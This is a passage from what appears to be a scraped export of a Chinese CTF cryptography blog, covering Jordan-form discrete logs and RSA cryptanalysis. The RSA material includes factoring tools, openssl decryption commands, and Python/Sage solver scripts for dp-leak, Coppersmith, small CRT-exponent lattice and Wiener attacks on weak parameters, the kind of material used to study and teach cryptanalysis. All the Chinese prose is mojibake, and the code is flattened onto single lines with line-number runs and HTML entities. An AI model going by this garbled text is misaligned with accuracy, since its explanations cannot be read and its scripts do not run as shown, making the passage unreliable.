$P^{-1}AP=\\text{diag}\\{J_1,J_2,\\cdots,J_s\\}$ï¼Œå…¶ä¸­ $J_1,J_2,\\cdots,J_s$ æ˜¯ Jordan å—ã€‚æ‰€è°“ç‰¹å¾å€¼ä¸º $\\lambda$ çš„ $n$ é˜¶ Jordan å—ï¼Œå°±æ˜¯ $n$ é˜¶çŸ©é˜µ $J_n(\\lambda)=\\left(\\begin{matrix} \\lambda &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 \\newline 0 &amp; \\lambda &amp; 1 &amp; \\cdots &amp; 0 &amp; 0 \\newline 0 &amp; 0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; 1 \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; \\lambda \\newline \\end{matrix}\\right)$ ç‰¹åˆ«åœ°ï¼Œå¯¹äºçŸ©é˜µ $A$ å¯å¯¹è§’åŒ–çš„æƒ…å½¢ï¼Œç›¸åº”çš„ Jordan å— $J_1,J_2,\\cdots,J_s$ å‡ä¸ºä¸€é˜¶çš„ã€‚ è®¡ç®— $(J_n(\\lambda))^k$. æ³¨æ„åˆ° $J_n(\\lambda)=\\lambda E+J_n(0)$, åº”ç”¨äºŒé¡¹å¼å®šç†ï¼Œå¾—åˆ° $(J_n(\\lambda))^k=\\left(\\begin{matrix} \\lambda^k &amp; k\\lambda^{k-1} &amp; \\cdots &amp; \\mathrm{C}_k^{n-1}\\lambda^{k-n+1} \\newline 0 &amp; \\lambda^k &amp; \\cdots &amp; \\mathrm{C}_k^{n-2}\\lambda^{k-n+2} \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; \\lambda^k \\newline \\end{matrix}\\right)$ å‚è€ƒï¼šSharif CTF 8 - ElGamat 12345678910n = p = A = []B = []G = matrix(GF(p), n, n, A)H = matrix(GF(p), n, n, B)G_Jor, P = G.jordan_form(transformation=True)H_Jor = ~P * H * P","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"ç¦»æ•£å¯¹æ•°","slug":"ç¦»æ•£å¯¹æ•°","permalink":"https://lazzzaro.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"}],"author":"Lazzaro"},{"title":"RSA","slug":"crypto-RSA","date":"2020-05-06T14:15:00.000Z","updated":"2023-11-02T11:54:59.358Z","comments":true,"path":"2020/05/06/crypto-RSA/","permalink":"https://lazzzaro.github.io/2020/05/06/crypto-RSA/","excerpt":"","text":"å¸¸ç”¨å·¥å…· åˆ†è§£å¤§ç´ æ•° factordb ï¼ˆhttp://www.factordb.com / API: http://factordb.com/api?query=ï¼‰ yafuï¼ˆ$p,q$ç›¸å·®è¿‡å¤§æˆ–è¿‡å°yafuå¯åˆ†è§£æˆåŠŸï¼‰ sage ï¼ˆdivisors(n)ï¼‰ï¼ˆå°ç´ æ•°ï¼‰ Pollardâ€™s pâˆ’1 ï¼ˆpython -m primefac -vs -m=p-1 xxxxxxxï¼‰ï¼ˆå…‰æ»‘æ•°ï¼‰ Williamsâ€™s p+1ï¼ˆpython -m primefac -vs -m=p+1 xxxxxxxï¼‰ï¼ˆå…‰æ»‘æ•°ï¼‰ cado-nfs åœ¨çº¿sageç¯å¢ƒï¼šhttps://sagecell.sagemath.org/ Openssl è§£æåŠ å¯†å¯†é’¥ï¼š openssl rsa -pubin -text -modulus -in pub.key ç”Ÿæˆè§£å¯†å¯†é’¥ï¼š python rsatool.py -f PEM -o key.key -p 1 -q 1 -e 1 openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag ï¼ˆOAEPæ–¹å¼ï¼‰ è„šæœ¬ç”Ÿæˆè§£å¯†å¯†é’¥ï¼š 12345678910111213141516# coding=utf-8import mathimport sysfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEP rsa_components = (n1, e, int(d1), p, q1)myrsa = RSA.construct(rsa_components)private = open(&#x27;private.pem&#x27;, &#x27;w&#x27;)private.write(myrsa.exportKey())private.close()rsakey = RSA.importKey(myrsa.exportKey()) rsakey = PKCS1_OAEP.new(rsakey)decrypted = rsakey.decrypt(c_bytes) è„šæœ¬é›† https://github.com/Ganapati/RsaCtfTool 1234567891011#ç”¨æ³•ä¸€ï¼šå·²çŸ¥å…¬é’¥(è‡ªåŠ¨æ±‚ç§é’¥) $ python3 RsaCtfTool.py --publickey å…¬é’¥æ–‡ä»¶ --uncipherfile åŠ å¯†æ–‡ä»¶ #ç”¨æ³•äºŒï¼šå·²çŸ¥å…¬é’¥æ±‚ç§é’¥ $ python3 RsaCtfTool.py --publickey å…¬é’¥æ–‡ä»¶ --private #ç”¨æ³•ä¸‰ï¼šå¯†é’¥æ ¼å¼è½¬æ¢ #æŠŠPEMæ ¼å¼çš„å…¬é’¥è½¬æ¢ä¸ºnï¼Œe $ python3 RsaCtfTool.py --dumpkey --key å…¬é’¥æ–‡ä»¶ #æŠŠn,eè½¬æ¢ä¸ºPEMæ ¼å¼ $ python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537 https://github.com/yifeng-lee/RSA-In-CTF https://github.com/ValarDragon/CTF-Crypto â€‹ å¸¸è§ç±»å‹ç»™p,q,e,c123456789101112import gmpy2 as gpimport binasciip = q = e = c = n = p*qphi = (p-1)*(q-1)d = gp.invert(e,phi)m = pow(c,d,n)print(m)print(bytes.fromhex(hex(m)[2:])) â€‹ ç»™n,e,dp,c$dp\\equiv d \\pmod {(p-1)}$ $\\because dp\\cdot e\\equiv d\\cdot e\\equiv 1 \\pmod {(p-1)}$ $\\therefore dp\\cdot e-1=k\\cdot (p-1)$ $\\therefore (dp\\cdot e-1)\\cdot d\\cdot e=kâ€™\\cdot (p-1),\\quad kâ€™=k\\cdot d\\cdot e \\\\\\Leftrightarrow d\\cdot e=-kâ€™\\cdot (p-1)+dp\\cdot e\\cdot d\\cdot e\\equiv 1 \\pmod{\\varphi(n)}\\\\\\Leftrightarrow -kâ€™\\cdot (p-1)+dp\\cdot e\\equiv 1\\pmod{\\varphi(n)}$ $\\therefore k_{1}\\cdot (p-1)+dp\\cdot e-1=k_{2}\\cdot (p-1)\\cdot (q-1)\\\\\\Leftrightarrow (p-1)\\cdot (k_{2}\\cdot (q-1)-k_{1})+1=dp\\cdot e$ $\\because dp&lt;p-1\\quad \\therefore (k_{2}\\cdot (q-1)-k_{1})\\in (0, e)$ $\\therefore$ éå† $(1, e)$ï¼Œå½“åŒæ—¶æ»¡è¶³ $(dp\\cdot e-1)\\bmod i==0$ å’Œ $n\\bmod((dp\\cdot e-1)//i+1)==0$ æ—¶ï¼Œ$N$ æˆåŠŸåˆ†è§£ã€‚ 12345678910111213141516171819202122import gmpy2 as gpe = n = dp = c = for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 if(n%p!=0): continue q=n//p phin=(p-1)*(q-1) d=gp.invert(e, phin) m=gp.powmod(c, d, n) if(len(hex(m)[2:])%2==1): continue print(&#x27;--------------&#x27;) print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) å˜ç§1ï¼šç»™ $p,e,d_p,c,b$ï¼Œå…¶ä¸­ $n=p^bq$ã€‚ Hensel lifting for Takagiâ€™s schemeï¼ˆp.189ï¼‰ï¼š 1234567891011121314from Crypto.Util.number import *import gmpy2p = dp = c = b = e = mp1 = pow(c, dp, p)mp = pow(c, dp - 1, p)for i in range(1, b - 2): x = pow(c - pow(mp1, e), 1, p**(i + 1)) y = pow(x * mp * (gmpy2.invert(e, p)), 1, p**(i + 1)) mp1 = mp1 + yprint(long_to_bytes(mp1)) å˜ç§2ï¼šç»™ $n,e,dp_0,c,k$ï¼Œå…¶ä¸­ $dp_0$ ä¸º $dp$ é«˜ $(n\\text{bits}-k)$ ä½ï¼Œå³ $dp_0=dp&gt;&gt;k$ã€‚ ï¼ˆCoppersmithæ”»å‡»ï¼Œå·²çŸ¥dpé«˜ä½æ”»å‡»ï¼‰ $e\\cdot dp \\equiv e\\cdot d\\equiv 1 \\pmod {(p-1)} \\\\\\Leftrightarrow e \\cdot dp=k(p-1)+1=kp-k+1 \\\\\\Leftrightarrow e\\cdot dp+k-1 \\equiv 0 \\pmod p$ $\\because dp&lt;p-1$ï¼Œ$\\therefore k&lt;e$ $\\therefore e\\cdot (dp_0&lt;&lt;k+x)+k-1 \\equiv 0 \\pmod p$ 1234567891011121314151617181920212223#Sagedp0 = e = n = F.&lt;x&gt; = PolynomialRing(Zmod(n))d = inverse_mod(e, n)for k in range(1, e): f = (secret &lt;&lt; 200) + x + (k - 1) * d x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret &lt;&lt; 200) for i in range(2, e): p = (e * Integer(dp) - 1 + i) // i if n % p == 0: break if p &lt; 0: continue else: print(&#x27;k = &#x27;,k) print(&#x27;p = &#x27;,p) print(&#x27;dp = &#x27;,dp) break å˜ç§3ï¼šç»™ $n,e,dp,c$â€‹â€‹ï¼Œå…¶ä¸­ $dp$â€‹â€‹â€‹ å¾ˆå°ï¼Œ$e$ å¾ˆå¤§ã€‚ æšä¸¾ $dp$ï¼Œå›  $e\\cdot dp \\equiv 1 \\pmod {(p-1)}$ï¼Œåˆç”±è´¹é©¬å°å®šç†ï¼Œå¯¹ä»»æ„ $r$ï¼Œæœ‰ $m^{e \\cdot dp}\\equiv m \\pmod p$ï¼Œå³ $p \\mid (m^{e \\cdot dp}-m)$ï¼› åˆ $p \\mid n$ï¼Œå¾ˆå¤§æ¦‚ç‡ $p=\\gcd(m^{e \\cdot dp}-m,n)$ã€‚ å˜ç§4ï¼šç»™ $N,e,c$ï¼Œå…¶ä¸­ $dp$ è¿‡å°ã€‚ æƒ…å½¢1ï¼š$q&lt;N^{0.382}$ å‚æ•° $\\beta=\\cfrac{q_{\\text{bit}}}{N_{\\text{bit}}}, \\delta=\\cfrac{dp_{\\text{bit}}}{N_{\\text{bit}}}$ï¼Œæ»¡è¶³ $3\\beta &lt; 1+\\beta^2+2\\delta$ï¼Œå¯ç¡®å®š $\\beta$ å’Œ $\\delta$ çš„å€¼ã€‚ æ„é€ æ ¼å­ç»´åº¦ä¸º $n$ï¼Œæ ¼å­ä¸­æ¨¡æ•° $N$ çš„æœ€å¤§æ¬¡å¹‚ä¸º $m$ï¼Œåº”æ»¡è¶³å…³ç³» $\\cfrac{m(m+1)}{2} + \\cfrac{n(n-1)(2\\delta+\\beta)}{2}-(1-\\beta)nm &lt; 0$ ç¡®å®š $\\beta$ å’Œ $\\delta$ ä¹‹åï¼Œå¯æšä¸¾ç¡®å®š $n$ å’Œ $m$ çš„å–å€¼ï¼ˆæœ€å°å€¼ï¼‰ï¼Œ$m=(1-\\beta)n$ æ˜¯ä¸€ä¸ªè¾ƒä¼˜çš„å–å€¼ã€‚ 12345beta = delta = n = round((1-2*beta-2*delta)/((1-beta)^2-2*delta-beta),6)m = (1-beta)*nprint(m,n) æ„é€ å¤šé¡¹å¼ï¼Œåˆ†è§£å¤šé¡¹å¼ä¸º $(ax+by)$ é¡¹ï¼Œå…¶ä¸­ $a=k,b=dp$ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940# è„šæœ¬1# Sagedef getC(Scale): C = [[0 for __ in range(Scale)] for _ in range(Scale)] for i in range(Scale): for j in range(Scale): if i == j or j == 0: C[i][j] = 1 else: C[i][j] = C[i-1][j-1] + C[i-1][j] return Cdef getMatrix(Scale, Mvalue, N, E, Del, Bet): M = [[0 for __ in range(Scale)] for _ in range(Scale)] C = getC(Scale) X, Y = int(pow(N,Del)*(Scale+1)//2), int(pow(N,(Del+Bet))*(Scale+1)//2) for i in range(Scale): for j in range(Scale): M[i][j] = N**max(Mvalue-i,0)*E**(max(i-j,0))*X**(Scale-1-j)*Y**j*C[i][j]*(-1)**j return MN =E =delta = 0.01beta = 0.37Scale = 35Mvalue = 22M = getMatrix(Scale,Mvalue,N,E,delta,beta)M = matrix(ZZ,M)A = M.LLL()[0]p = []X = int(pow(N,delta)*(Scale+1)//2)Y = int(pow(N,(delta+beta))*(Scale+1)//2)for i in range(Scale): p.append(A[i]//(X**(Scale-1-i)*Y**i))PR.&lt;x,y&gt; = PolynomialRing(ZZ)f = 0for i in range(Scale): f += p[i]*x^(Scale-1-i)*y^iprint(f.factor()) 123456789101112131415161718192021222324252627282930313233343536# è„šæœ¬2# SageN =e =n = 12beta = 0.36delta = 0.02X = int(N ** delta*(n+1)/2)Y = int(N ** (delta + beta)*(n+1)/2)def C(a,b): ret=1 for i in range(b): ret *= (a-i) ret /= (b-i) return retdef get_Matrix(n,m): MM=[[0 for __ in range(n)] for _ in range(n)] for j in range(n): pN = max(0,m-j) for i in range(j+1): MM[j][i] = pow(N,pN)*pow(X,n-i-1)*pow(Y,i)*pow(e,j-i)*C(j,i)*pow(-1,i) MM = Matrix(ZZ,MM) return MMM = get_Matrix(n,n//2+1)L = M.LLL()[0]x,y = var(&#x27;x&#x27;),var(&#x27;y&#x27;)f = 0for i in range(n): f += x**(n-i-1) * y**i * (L[i] // pow(X,n-i-1) // pow(Y,i))print(f.factor()) å‚è€ƒï¼š Cryptanalysis of Unbalanced RSA with Small CRT-Exponent https://hash-hash.github.io/2022/05/14/Unbalanced-RSA-with-Small-CRT-Exponent/#An-Approach-Modulo-e NSSCTF Round#3 - Secure_in_N æƒ…å½¢2ï¼š$q&lt;N^{0.468}$ å‚æ•° $\\beta=\\cfrac{q_{\\text{bit}}}{N_{\\text{bit}}}, \\delta=\\cfrac{dp_{\\text{bit}}}{N_{\\text{bit}}},\\alpha=\\cfrac{e_{\\text{bit}}}{N_{\\text{bit}}}$ï¼Œ å˜é‡ä¸Šç•Œ $X=2N^{\\alpha+\\beta+\\delta-1},Y=N^{\\beta},Z=2N^{1-\\beta}$ ï¼Œå¯¹äºå˜é‡ $m$ éœ€å……åˆ†å¤§ã€‚ $\\tau=\\cfrac{(1-\\beta)^2-\\delta}{2\\beta(1-\\beta)},\\sigma=\\cfrac{1-\\beta-\\delta}{2(1-\\beta)},t=\\tau m,s=\\sigma m$ æ•´æ•°åŸŸä¸Šæœ‰æ ¹ $(x,y,z)=(x_0,p,q)$ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117from copy import deepcopy# https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf# Author: ZM__________J, To1inN = e = alpha = log(e, N)beta = delta = P.&lt;x,y,z&gt;=PolynomialRing(ZZ) X = ceil(2 * N^(alpha + beta + delta - 1))Y = ceil(2 * N^beta)Z = ceil(2 * N^(1 - beta)) def f(x,y): return x*(N-y)+Ndef trans(f): my_tuples = f.exponents(as_ETuples=False) g = 0 for my_tuple in my_tuples: exponent = list(my_tuple) mon = x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2] tmp = f.monomial_coefficient(mon) my_minus = min(exponent[1], exponent[2]) exponent[1] -= my_minus exponent[2] -= my_minus tmp *= N^my_minus tmp *= x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2] g += tmp return g m = 5 # need to be adjusted according to different situationstau = ((1 - beta)^2 - delta) / (2 * beta * (1 - beta))sigma = (1 - beta - delta) / (2 * (1 - beta)) print(sigma * m)print(tau * m) s = ceil(sigma * m)t = ceil(tau * m)my_polynomials = []for i in range(m+1): for j in range(m-i+1): g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i) my_polynomials.append(g_ij) for i in range(m+1): for j in range(1, t+1): h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i) my_polynomials.append(h_ij) known_set = set()new_polynomials = []my_monomials = [] # construct partial orderwhile len(my_polynomials) &gt; 0: for i in range(len(my_polynomials)): f = my_polynomials[i] current_monomial_set = set(x^tx * y^ty * z^tz for tx, ty, tz in f.exponents(as_ETuples=False)) delta_set = current_monomial_set - known_set if len(delta_set) == 1: new_monomial = list(delta_set)[0] my_monomials.append(new_monomial) known_set |= current_monomial_set new_polynomials.append(f) my_polynomials.pop(i) break else: raise Exception(&#x27;GG&#x27;) my_polynomials = deepcopy(new_polynomials) nrows = len(my_polynomials)ncols = len(my_monomials)L = [[0 for j in range(ncols)] for i in range(nrows)] for i in range(nrows): g_scale = my_polynomials[i](X * x, Y * y, Z * z) for j in range(ncols): L[i][j] = g_scale.monomial_coefficient(my_monomials[j]) # remove N^jfor i in range(nrows): Lii = L[i][i] N_Power = 1 while (Lii % N == 0): N_Power *= N Lii //= N L[i][i] = Lii for j in range(ncols): if (j != i): L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m)) L = Matrix(ZZ, L)nrows = L.nrows() L = L.LLL()# Recover polyreduced_polynomials = []for i in range(nrows): g_l = 0 for j in range(ncols): g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j] reduced_polynomials.append(g_l) # eliminate zmy_ideal_list = [y * z - N] + reduced_polynomials # Varietymy_ideal_list = [Hi.change_ring(QQ) for Hi in my_ideal_list]for i in range(len(my_ideal_list),3,-1): print(i) V = Ideal(my_ideal_list[:i]).variety(ring=ZZ) print(V) å‚è€ƒï¼š New Attacks on RSA with Small Secret CRT-Exponents NCTF 2022 - dp_promax â€‹ ç»™p,q,dp,dq,c$dp=d \\bmod (p-1)$ï¼Œ$dq=d \\bmod (q-1)$ $\\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq\\\\\\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1)\\\\\\Leftrightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}=\\frac{dq-dp}{\\gcd(p-1,q-1)}+k_{2}\\frac{q-1}{\\gcd(p-1,q-1)}\\\\\\Rightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}\\equiv\\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}\\\\\\Leftrightarrow k_{1}\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}$ å°† $k_{1}=k_{3}\\frac{q-1}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)}$ ä»£å…¥ $d=k_{1}(p-1)+dp$ $d=k_{3}\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp\\\\\\Rightarrow d\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp \\pmod{\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}}$ 12345678910111213141516171819import gmpy2 as gpp = q = dp = dq = c = n = p*qphin = (p-1)*(q-1)dd = gp.gcd(p-1, q-1)d=(dp-dq)//dd * gp.invert((q-1)//dd, (p-1)//dd) * (q-1) +dqprint(d)m = gp.powmod(c, d, n)print(&#x27;-------------------&#x27;)print(m)print(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) â€‹ ç»™e,d,nè®¡ç®— $k=ed-1$ï¼Œé€‰æ‹©ä¸€ä¸ªéšæœºæ•° $g,g \\in (1,N)$ã€‚ $k$ ä¸ºå¶æ•°ï¼Œæ•… $k=2^tr$ï¼Œå…¶ä¸­ $r$ ä¸ºå¥‡æ•°ä¸” $t \\ge 1$ï¼Œç„¶åè®¡ç®— $x = g^{\\frac{k}{2}},g^{\\frac{k}{4}},\\cdots,g^{\\frac{k}{2^t}} \\pmod N$ ç›´åˆ° $x \\gt 1$ ä¸” $y=\\gcd(x-1,N) \\gt 1$ã€‚ å¦‚æœè¿™æ ·çš„ $y$ å­˜åœ¨ï¼Œåˆ™å…¶ä¸­çš„å› å­ $p=y,q=\\cfrac{N}{y}$ï¼›å¦‚è¿™æ ·çš„ $y$ ä¸å­˜åœ¨ï¼Œåˆ™é‡æ–°ç”Ÿæˆéšæœºæ•° $g$ã€‚ 1234567891011121314151617181920import randomimport gmpy2def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p) p, q = divide_pq(e, d, n)print(f&#x27;p = &#123;p&#125;&#x27;)print(f&#x27;q = &#123;q&#125;&#x27;) 12345678910111213141516171819202122232425262728import randomimport gmpy2def factor_with_kphi(n, kphi): t = 0 while kphi % 2 == 0: kphi &gt;&gt;= 1 t += 1 for i in range(1, 101): g = random.randint(0, n) y = pow(g, kphi, n) if y == 1 or y == n - 1: continue else: for j in range(1, t): x = pow(y, 2, n) if x == 1: p = gcd(n, y-1) q = n//p return p, q elif x == n - 1: continue y = x x = pow(y, 2, n) if x == 1: p = gcd(n, y-1) q = n//p return p, q â€‹ ä½è§£å¯†æŒ‡æ•°æ”»å‡»/ä½ç§é’¥æŒ‡æ•°æ”»å‡»ï¼ˆeé•¿åº¦è¾ƒå¤§ï¼Œdå°ï¼ŒWiener Attackï¼‰é€‚ç”¨æƒ…å†µï¼šå·²çŸ¥ $N,e$ï¼Œä¸” $e$ è¿‡å¤§æˆ–è¿‡å°ã€‚ $\\varphi(n) = (p-1)(q-1)=pq - (p + q) + 1=N - (p + q) + 1$ $\\because p, q$ éå¸¸å¤§ï¼Œ$\\therefore\\,pq\\gg p+q$ï¼Œ $\\therefore\\varphi(n)\\approx N$ $\\because ed\\equiv1\\,mod\\,\\varphi(n)$ï¼Œ$\\therefore ed-1=k\\varphi(n)$ï¼Œè¿™ä¸ªå¼å­ä¸¤è¾¹åŒé™¤ $d\\varphi(n)$ å¯å¾—ï¼š $\\cfrac{e}{\\varphi(n)}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$ $\\because \\varphi(n)\\approx N$ï¼Œ$\\therefore \\cfrac{e}{N}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$ï¼ŒåŒæ · $d\\varphi(n)$ æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œæ‰€ä»¥ $\\cfrac{e}{N}$ ç•¥å¤§äº $\\cfrac{k}{d}$ å› ä¸º $e$ å’Œ $N$ æ˜¯çŸ¥é“çš„ï¼Œæ‰€ä»¥è®¡ç®—å‡º $\\cfrac{e}{N}$ åï¼Œæ¯”å®ƒç•¥å°çš„ $\\cfrac{k}{d}$ ï¼Œå¯ä»¥é€šè¿‡è®¡ç®— $\\cfrac{e}{N}$ çš„è¿åˆ†æ•°å±•å¼€ï¼Œä¾æ¬¡ç®—å‡ºè¿™ä¸ªåˆ†æ•°æ¯ä¸€ä¸ªæ¸è¿›åˆ†æ•°ï¼Œç”±äº $\\cfrac{e}{N}$ ç•¥å¤§äº $\\cfrac{k}{d}$ï¼ŒWiener è¯æ˜äº†ï¼Œè¯¥æ”»å‡»èƒ½ç²¾ç¡®çš„è¦†ç›– $\\cfrac{k}{d}$ã€‚ åœ¨ $e$ è¿‡å¤§æˆ–è¿‡å°çš„æƒ…å†µä¸‹ï¼Œå¯ä½¿ç”¨ç®—æ³•ä» $e$ ä¸­å¿«é€Ÿæ¨æ–­å‡º $d$ çš„å€¼ã€‚å¯ä»¥è§£å†³ $q&lt;p&lt;2q,d&lt;\\cfrac{1}{3}N^{\\frac{1}{4}}$ çš„é—®é¢˜ã€‚ RSAWienerHackerå·¥å…·ï¼šhttps://github.com/pablocelayes/rsa-wiener-attack 12345678910111213141516171819202122232425#è„šæœ¬1#Sagedef factor_rsa_wiener(N, e): N = Integer(N) e = Integer(e) cf = (e / N).continued_fraction().convergents() for f in cf: k = f.numer() d = f.denom() if k == 0: continue phi_N = ((e * d) - 1) / k b = -(N - phi_N + 1) dis = b ^ 2 - 4 * N if dis.sign() == 1: dis_sqrt = sqrt(dis) p = (-b + dis_sqrt) / 2 q = (-b - dis_sqrt) / 2 if p.is_integer() and q.is_integer() and (p * q) % N == 0: p = p % N q = q % N if p &gt; q: return (p, q) else: return (q, p) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#è„šæœ¬2#Sagedef rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)n = e = c = def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return dd = crack_rsa(e, n)m = hex(pow(c, d, n))[2:]print(bytes.fromhex(m)) 12345678910111213141516171819202122232425262728293031#è„šæœ¬3from Crypto.Util.number import long_to_bytese = n = c = #å°†åˆ†æ•°x/yå±•å¼€ä¸ºè¿åˆ†æ•°çš„å½¢å¼def transform(x,y): arr=[] while y: arr+=[x//y] x,y=y,x%y return arr #æ±‚è§£æ¸è¿›åˆ†æ•°def sub_fraction(k): x=0 y=1 for i in k[::-1]: x,y=y,x+i*y return (y,x)data=transform(e,n)for x in range(1,len(data)+1): data1=data[:x] d = sub_fraction(data1)[1] m = pow(c,d,n) flag = long_to_bytes(m) if b&#x27;flag&#123;&#x27; in flag: print(flag) break å˜ç§1ï¼š$\\cfrac{N_1}{N_2}&lt;\\cfrac{q_1}{q_2}&lt;1$ å‚è€ƒï¼š2020å¹´ç¾ŠåŸæ¯ - RRRRRRRSA Paper: https://eprint.iacr.org/2015/399.pdf å°è¯•å¯¹ $\\cfrac{N_1}{N_2}$ è¿›è¡Œè¿åˆ†æ•°å±•å¼€å¹¶æ±‚å…¶å„é¡¹æ¸è¿›åˆ†æ•°ï¼Œè®°ä¸º $\\cfrac{t_i}{s_i}$ å¹¶éªŒè¯ $N_1\\% {t_k}==0$ æ˜¯å¦æˆç«‹ï¼Œå¦‚æœæˆç«‹ï¼Œé‚£ä¹ˆ $q_1=t_kï¼Œq_2=s_k$ã€‚ è¿åˆ†æ•°é€¼è¿‘ï¼š 123456789101112131415161718192021222324252627282930def transform(x,y): #ä½¿ç”¨è¾—è½¬ç›¸é™¤å°†åˆ†æ•°x/yè½¬ä¸ºè¿åˆ†æ•°çš„å½¢å¼ res=[] while y: res.append(x//y) x,y=y,x%y return res def continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: #ä»sublistçš„åé¢å¾€å‰å¾ªç¯ denominator,numerator=numerator,i*numerator+denominator return denominator,numerator #å¾—åˆ°æ¸è¿›åˆ†æ•°çš„åˆ†æ¯å’Œåˆ†å­ï¼Œå¹¶è¿”å› #æ±‚è§£æ¯ä¸ªæ¸è¿›åˆ†æ•°def sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) #å°†è¿åˆ†æ•°çš„ç»“æœé€ä¸€æˆªå–ä»¥æ±‚æ¸è¿›åˆ†æ•° return res def wienerAttack(n1,n2): for (q2,q1) in sub_fraction(n1,n2): #ç”¨ä¸€ä¸ªforå¾ªç¯æ¥æ³¨æ„è¯•æ¢n1/n2çš„è¿ç»­å‡½æ•°çš„æ¸è¿›åˆ†æ•°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æ¸è¿›åˆ†æ•° if q1==0: #å¯èƒ½ä¼šå‡ºç°è¿åˆ†æ•°çš„ç¬¬ä¸€ä¸ªä¸º0çš„æƒ…å†µï¼Œæ’é™¤ continue if n1%q1==0 and q1!=1: #æˆç«‹æ¡ä»¶ return (q1,q2) print(&quot;è¯¥æ–¹æ³•ä¸é€‚ç”¨&quot;) N1=N2=print(wienerAttack(N1,N2)) å˜ç§2ï¼š$Ax \\equiv y \\pmod P$ï¼Œå³ $Ax-kP=y$ æˆ– $Ax+kP=y$ Wienerâ€™sï¼š $\\Big\\vert \\cfrac{A}{P}-\\cfrac{k}{x}\\Big\\vert \\le \\cfrac{1}{2x^2}$ï¼Œè¿åˆ†æ•°æ–¹æ³•ï¼Œç”¨ $\\cfrac{A}{P}$ 